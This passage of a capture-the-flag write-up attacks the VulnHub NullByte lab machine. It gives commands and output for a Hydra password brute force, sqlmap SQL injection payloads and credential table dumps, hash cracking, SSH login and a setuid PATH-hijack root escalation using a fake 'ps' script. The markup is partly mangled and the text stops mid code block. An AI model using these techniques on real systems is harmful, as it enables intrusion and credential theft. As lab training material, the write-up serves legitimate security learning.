+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Target IP:          10.1.1.134&lt;/li>
+</span><span class='line'>&lt;li>Target Hostname:    10.1.1.134&lt;/li>
+</span><span class='line'>&lt;li>Target Port:        80
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Start Time:         2015-08-17 07:01:56 (GMT-4)&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Server: Apache/2.4.10 (Debian)&lt;/li>
+</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, fields: 0xc4 0x51c42a5c32a70&lt;/li>
+</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
+</span><span class='line'>&lt;li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li>
+</span><span class='line'>&lt;li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/li>
+</span><span class='line'>&lt;li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)&lt;/li>
+</span><span class='line'>&lt;li>Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/li>
+</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li>
+</span><span class='line'>&lt;li>Uncommon header &lsquo;x-ob_mode&rsquo; found, with contents: 0&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
+</span><span class='line'>&lt;li>/phpmyadmin/: phpMyAdmin directory found&lt;/li>
+</span><span class='line'>&lt;li>7668 requests: 0 error(s) and 9 item(s) reported on remote host
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>End Time:           2015-08-17 07:02:17 (GMT-4) (21 seconds)&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
+</ul>
+
+
+<p>Nothing too exciting, but found phpmyadmin installed and a folder <code>/phpmyadmin/</code>.</p>
+
+<h3>Secret in the Pic</h3>
+
+<p>Then I tried default password and some weak passwords with login phpmyadmin, but all failed.</p>
+
+<p>Then I open iceweasel browser to have a close look at the website. There is only a picture with a sentence <code>If you search for the laws of harmony, you will find knowledge.</code></p>
+
+<p>Nothing wrong about the sentence&hellip; but hint is hidden in the picture&hellip;</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ strings main.gif
+</span><span class='line'>GIF89a
+</span><span class='line'>P-): kzMb5nVYJw
+</span><span class='line'>cccIII@@@GGG444999`&ldquo;&lt;&lt;&lt;
+</span><span class='line'>ooo>>>EEE
+</span><span class='line'>???^^^
+</span><span class='line'>HHH;;;
+</span><span class='line'>gggRRRJJJ+++
+</span><span class='line'>TTTZZZ
+</span><span class='line'>QQQ///
+</span><span class='line'>~~~&rdquo;&lsquo;CCC
+</span><span class='line'>   AAA
+</span><span class='line'>aaa222
+</span><span class='line'>&hellip; &hellip;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Pay attention to the second line below the <code>GIF89a</code>:</p>
+
+<p><code>P-): kzMb5nVYJw</code></p>
+
+<p>Then I tried to use the string &lsquo;kzMb5nVYJw&rsquo; as an hidden folder and found the hidden login page:</p>
+
+<p><img class="left" src="/downloads/nullbyte1/1.png"></p>
+
+<p>From the source code, I noticed that this form is not connected to mysql and password is not complex&hellip; so here would be an online brute force attacking based on password-dict.</p>
+
+<p>I use Hydra with rockyou.txt dictionary to brute force the login form and got the password: <code>elite</code>. (The parameter <code>-l admin</code> does not make any sense, just get rid of errors)</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.1.1.134 http-post-form &ldquo;/kzMb5nVYJw/index.php:key=^PASS^:invalid&rdquo;
+</span><span class='line'>[sudo] password for F4l13n:
+</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-08-17 09:20:13
+</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort&hellip;
+</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
+</span><span class='line'>[DATA] attacking service http-post-form on port 80
+</span><span class='line'>[80][http-post-form] host: 10.1.1.134   login: admin   password: elite
+</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
+</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-08-17 09:20:57</span></code></pre></td></tr></table></div></figure></p>
+
+<p>When I logged in with password <code>elite</code>, I have been forwarded to the following username searching page.</p>
+
+<p><img class="left" src="/downloads/nullbyte1/2.png"></p>
+
+<p>After tired several common SQLi test, I found SQL injection vulnerability exists in the parameter <code>usrtosearch</code>, the injection point is <code>http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=admin</code></p>
+
+<p>Then I use SQLMAP to finish all the rest works:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;dbs
+</span><span class='line'>&hellip; &hellip;
+</span><span class='line'>[09:45:30] [WARNING] in OR boolean-based injections, please consider usage of switch &lsquo;&ndash;drop-set-cookie&rsquo; if you experience any problems during data retrieval
+</span><span class='line'>URI parameter &lsquo;#1*&rsquo; is vulnerable. Do you want to keep testing the others (if any)? [y/N]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Parameter: #1* (URI)
+</span><span class='line'>    Type: boolean-based blind
+</span><span class='line'>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+</span><span class='line'>    Payload: &lt;a href="http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162">http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162&lt;/a>" OR 3808=3808#&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>Type: AND/OR time-based blind
+</span><span class='line'>Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)
+</span><span class='line'>Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" AND (SELECT * FROM (SELECT(SLEEP(5)))hjFz)#
+</span><span class='line'>
+</span><span class='line'>Type: UNION query
+</span><span class='line'>Title: MySQL UNION query (NULL) - 3 columns
+</span><span class='line'>Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x6845736a5777725a736a,0x71706b7a71)#
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;p>[09:45:32] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Debian
+</span><span class='line'>web application technology: Apache 2.4.10
+</span><span class='line'>back-end DBMS: MySQL 5.0.12
+</span><span class='line'>[09:45:32] [INFO] fetching database names
+</span><span class='line'>available databases [5]:
+</span><span class='line'>[&lt;em>] information_schema
+</span><span class='line'>[&lt;/em>] mysql
+</span><span class='line'>[&lt;em>] performance_schema
+</span><span class='line'>[&lt;/em>] phpmyadmin
+</span><span class='line'>[*] seth&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[09:45:33] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[*] shutting down at 09:45:33</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Checking the databases to grab passwords:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;batch &ndash;smart &ndash;dump -C User,Password,Host,Super_priv -T user -D mysql&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&hellip; &hellip;
+</span><span class='line'>Database: mysql
+</span><span class='line'>Table: user
+</span><span class='line'>[6 entries]
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
+</span><span class='line'>| User             | Password                                              | Host      | Super_priv |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
+</span><span class='line'>| root             | &lt;em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | Y          |
+</span><span class='line'>| root             | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | nullbyte  | Y          |
+</span><span class='line'>| root             | &lt;em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | 127.0.0.1 | Y          |
+</span><span class='line'>| root             | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | ::1       | Y          |
+</span><span class='line'>| debian-sys-maint | &lt;em>BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC             | localhost | Y          |
+</span><span class='line'>| phpmyadmin       | &lt;/em>18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | N          |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[09:56:13] [WARNING] table &lsquo;mysql.&lt;code>user&lt;/code>&rsquo; dumped to CSV file &lsquo;/root/.sqlmap/output/10.1.1.134/dump/mysql/user-f3649c95.csv&rsquo;
+</span><span class='line'>[09:56:13] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[*] shutting down at 09:56:13</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Found mysql database login (this also can be used to login phpmyadmin): <code>root / sunnyvale</code></p>
+
+<h3>Be ramses!</h3>
+
+<p>There is another users table in database <code>seth</code>, which including the password hash of user <code>ramses</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u &ldquo;&lt;a href="http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*">http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*&lt;/a>&rdquo; &ndash;batch &ndash;smart &ndash;dump -T users -D seth
+</span><span class='line'>&hellip; &hellip;
+</span><span class='line'>[10:12:15] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Debian
+</span><span class='line'>web application technology: Apache 2.4.10
+</span><span class='line'>back-end DBMS: MySQL 5.0.12
+</span><span class='line'>[10:12:15] [INFO] fetching columns &lsquo;position, user, id, pass&rsquo; for table &lsquo;users&rsquo; in database &lsquo;seth&rsquo;
+</span><span class='line'>[10:12:15] [INFO] fetching entries of column(s) &lsquo;&lt;code>position&lt;/code>, &lt;code>user&lt;/code>, id, pass&rsquo; for table &lsquo;users&rsquo; in database &lsquo;seth&rsquo;
+</span><span class='line'>[10:12:15] [INFO] analyzing table dump for possible password hashes
+</span><span class='line'>Database: seth
+</span><span class='line'>Table: users
+</span><span class='line'>[2 entries]
+</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+</span><span class='line'>| id | user   | position   | pass                                        |
+</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+</span><span class='line'>| 1  | ramses | &lt;blank>    | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
+</span><span class='line'>| 2  | isis   | employee   | &ndash;not allowed&ndash;                             |
+</span><span class='line'>+&mdash;-+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[10:12:15] [INFO] table &lsquo;seth.users&rsquo; dumped to CSV file &lsquo;/root/.sqlmap/output/10.1.1.134/dump/seth/users.csv&rsquo;
+</span><span class='line'>[10:12:15] [INFO] fetched data logged to text files under &lsquo;/root/.sqlmap/output/10.1.1.134&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[*] shutting down at 10:12:15</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Found user login credentials: <code>ramses / YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>
+
+<p>Base64 decoded the encrypted password and got a MD5 hash: <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
+</span><span class='line'>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then crack the MD5 hash to get password in plaintext, which is <code>omega</code></p>
+
+<p>Then downloading <code>/etc/passwd</code> for further enumeration.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a>
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span><span class='line'>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span><span class='line'>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span><span class='line'>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span><span class='line'>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span><span class='line'>messagebus:x:104:111::/var/run/dbus:/bin/false
+</span><span class='line'>avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+</span><span class='line'>Debian-exim:x:106:114::/var/spool/exim4:/bin/false
+</span><span class='line'>statd:x:107:65534::/var/lib/nfs:/bin/false
+</span><span class='line'>colord:x:108:117:colord colour management daemon,,,:/var/lib/colord:/bin/false
+</span><span class='line'>sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>saned:x:110:119::/var/lib/saned:/bin/false
+</span><span class='line'>hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+</span><span class='line'>eric:x:1001:1001:,,,:/home/eric:/bin/bash
+</span><span class='line'>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+</span><span class='line'>ramses:x:1002:1002:,,,:/home/ramses:/bin/bash</span></code></pre></td></tr></table></div></figure></p>
+
+<p>user <code>ramses</code> found in <code>/etc/passwd</code> file.</p>
+
+<p>From previous findings, I know SSH is open on port 777, so try to SSH login with cracked password <code>ramses / omega</code> and bingo!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte/sqlmap_rst$ ssh &lt;a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#114;&#x61;&#x6d;&#x73;&#101;&#x73;&#64;&#x31;&#x30;&#46;&#x31;&#x2e;&#x31;&#46;&#49;&#x33;&#x34;">&#114;&#97;&#x6d;&#115;&#101;&#115;&#64;&#49;&#48;&#x2e;&#x31;&#x2e;&#x31;&#x2e;&#x31;&#51;&#x34;&lt;/a> -p 777
+</span><span class='line'>&lt;a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x72;&#x61;&#109;&#x73;&#x65;&#115;&#x40;&#x31;&#48;&#46;&#x31;&#46;&#49;&#46;&#49;&#51;&#x34;">&#114;&#x61;&#109;&#x73;&#101;&#115;&#64;&#x31;&#x30;&#46;&#49;&#x2e;&#49;&#46;&#49;&#x33;&#52;&lt;/a>&rsquo;s password:&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
+</span><span class='line'>ramses@NullByte:~$ id
+</span><span class='line'>uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
+</span><span class='line'>ramses@NullByte:~$ pwd
+</span><span class='line'>/home/ramses
+</span><span class='line'>ramses@NullByte:~$</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now I am ramses!</p>
+
+<h3>Privilege Escalation</h3>
+
+<p>Looking around and found interesting program <code>procwatch</code> which has <code>setuid</code> set in the folder <code>/var/www/backup</code></p>
+
+<p>By running the program and analysing the outcome, I can recognize that it calls system command <code>ps</code> in the program. However the program does not use full path of <code>ps</code>, so here is mis-configuration vulnerability which could be exploited by an attacker to make fake <code>ps</code> and set <code>$PATH</code> to get ROOT privilege.</p>
+
+<p>Then I wrote a shell script and saved as &lsquo;ps&rsquo;, and grant executable permition for it.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cat ps&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>!/bin/sh&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>id
+</span><span class='line'>/bin/sh&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>chmod +x ps&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then change the environment variable <code>$PATH</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
+</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</span><span class='line'>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
+</span><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
+</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then run the program <code>procwatch</code> to get ROOT:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
